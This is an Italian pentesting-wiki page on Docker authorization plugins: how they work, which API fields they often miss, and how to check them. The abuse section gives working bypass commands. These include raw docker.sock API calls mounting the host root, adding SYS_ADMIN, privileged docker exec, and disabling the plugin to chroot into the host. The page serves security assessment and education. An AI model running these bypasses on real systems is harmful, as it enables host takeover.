# Plugin di autorizzazione a runtime

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I plugin di autorizzazione a runtime sono uno strato di policy aggiuntivo che decide se un richiedente può eseguire una determinata azione del daemon. Docker è l'esempio classico. Per impostazione predefinita, chiunque possa comunicare con il Docker daemon ha di fatto un ampio controllo su di esso. I plugin di autorizzazione cercano di restringere quel modello esaminando l'identità dell'utente autenticato e l'operazione API richiesta, quindi permettendo o negando la richiesta secondo la policy.

Questo argomento merita una pagina a sé perché cambia il modello di exploitation quando un attaccante ha già accesso all'API di Docker o a un utente nel gruppo `docker`. In tali ambienti la domanda non è più solo "posso raggiungere il daemon?" ma anche "il daemon è protetto da uno strato di autorizzazione e, in tal caso, tale strato può essere bypassato tramite endpoint non gestiti, parsing JSON debole o permessi di gestione dei plugin?"

## Funzionamento

Quando una richiesta raggiunge il Docker daemon, il sottosistema di autorizzazione può passare il contesto della richiesta a uno o più plugin installati. Il plugin vede l'identità dell'utente autenticato, i dettagli della richiesta, header selezionati e parti del corpo della richiesta o della risposta quando il tipo di contenuto è adatto. Più plugin possono essere concatenati e l'accesso è concesso solo se tutti i plugin permettono la richiesta.

Questo modello sembra forte, ma la sua sicurezza dipende interamente da quanto completamente l'autore della policy ha compreso l'API. Un plugin che blocca `docker run --privileged` ma ignora `docker exec`, manca chiavi JSON alternative come il top-level `Binds`, o permette l'amministrazione dei plugin può creare un falso senso di restrizione lasciando comunque aperte vie dirette di privilege-escalation.

## Bersagli comuni dei plugin

Aree importanti per la revisione della policy sono:

- endpoint di creazione dei container
- campi di `HostConfig` come `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, e opzioni di condivisione dei namespace
- comportamento di `docker exec`
- endpoint per la gestione dei plugin
- qualsiasi endpoint che possa innescare indirettamente azioni a runtime al di fuori del modello di policy previsto

Storicamente, esempi come il plugin `authz` di Twistlock e semplici plugin didattici come `authobot` hanno reso questo modello facile da studiare perché i loro file di policy e i percorsi di codice mostravano come la mappatura endpoint-azione fosse effettivamente implementata. Per i lavori di assessment, la lezione importante è che l'autore della policy deve comprendere l'intera superficie dell'API piuttosto che solo i comandi CLI più visibili.

## Abuso

Il primo obiettivo è capire cosa è effettivamente bloccato. Se il daemon nega un'azione, l'errore spesso leaks il nome del plugin, il che aiuta a identificare il controllo in uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se hai bisogno di una profilazione degli endpoint più ampia, strumenti come `docker_auth_profiler` sono utili perché automatizzano il compito altrimenti ripetitivo di verificare quali rotte API e strutture JSON sono effettivamente permesse dal plugin.

Se l'ambiente utilizza un plugin personalizzato e puoi interagire con l'API, enumera quali campi degli oggetti sono effettivamente filtrati:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Questi controlli sono importanti perché molti fallimenti di autorizzazione sono specifici per campo piuttosto che specifici per il concetto. Un plugin può rifiutare un pattern CLI senza bloccare completamente la struttura API equivalente.

### Esempio completo: `docker exec` aggiunge privilegi dopo la creazione del container

Una policy che blocca la creazione di container privilegiati ma consente la creazione di container non confinati e l'uso di `docker exec` può comunque essere bypassata:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se il daemon accetta il secondo step, l'utente ha recuperato un processo interattivo privilegiato all'interno di un container che l'autore della policy riteneva vincolato.

### Esempio completo: Bind Mount Through Raw API

Alcune policy difettose ispezionano solo una JSON shape. Se il bind mount del root filesystem non viene bloccato in modo coerente, l'host può comunque essere montato:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La stessa idea può anche apparire sotto `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impatto è un completo host filesystem escape. Il dettaglio interessante è che il bypass deriva da una copertura incompleta della policy piuttosto che da un kernel bug.

### Esempio completo: Unchecked Capability Attribute

Se la policy dimentica di filtrare un attributo relativo alla capability, l'attacker può creare un container che riacquista una capability pericolosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una volta che `CAP_SYS_ADMIN` o una capability altrettanto potente è presente, molte breakout techniques descritte in [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) diventano sfruttabili.

### Esempio completo: disabilitare il plugin

Se le operazioni di gestione dei plugin (plugin-management) sono permesse, il bypass più pulito potrebbe essere disattivare completamente il controllo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Si tratta di una policy failure a livello di control-plane. L'authorization layer esiste, ma l'utente che avrebbe dovuto essere limitato conserva ancora il permesso di disattivarlo.

## Controlli

Questi comandi sono pensati per identificare se esiste un policy layer e se sembra essere completo o superficiale.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Aspetti rilevanti:

- I messaggi di negazione che includono il nome di un plugin confermano un livello di autorizzazione e spesso rivelano l'implementazione esatta.
- Una lista di plugin visibile all'attaccante può essere sufficiente per determinare se operazioni di disable o reconfigure sono possibili.
- Una policy che blocca solo le azioni CLI ovvie ma non le richieste raw API dovrebbe essere considerata bypassabile fino a prova contraria.

## Impostazioni runtime predefinite

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Non abilitato per impostazione predefinita | L'accesso al daemon è di fatto tutto-o-nulla a meno che non sia configurato un plugin di autorizzazione | politica del plugin incompleta, blacklist invece di allowlist, consentire la gestione dei plugin, punti ciechi a livello di campo |
| Podman | Non è un equivalente diretto comune | Podman si basa tipicamente più su permessi Unix, esecuzione rootless e decisioni di esposizione dell'API che su Docker-style authz plugins | esporre ampiamente un'API Podman con privilegi root, permessi deboli sul socket |
| containerd / CRI-O | Modello di controllo diverso | Questi runtime solitamente si affidano a permessi del socket, confini di trust del nodo e controlli dell'orchestrator a livello superiore piuttosto che ai Docker authz plugins | montare il socket nei workload, assunzioni di trust locale del nodo deboli |
| Kubernetes | Usa authn/authz a livello di API-server e kubelet, non Docker authz plugins | RBAC del cluster e admission controls sono il principale livello di policy | RBAC troppo ampio, policy di admission deboli, esposizione diretta di kubelet o runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
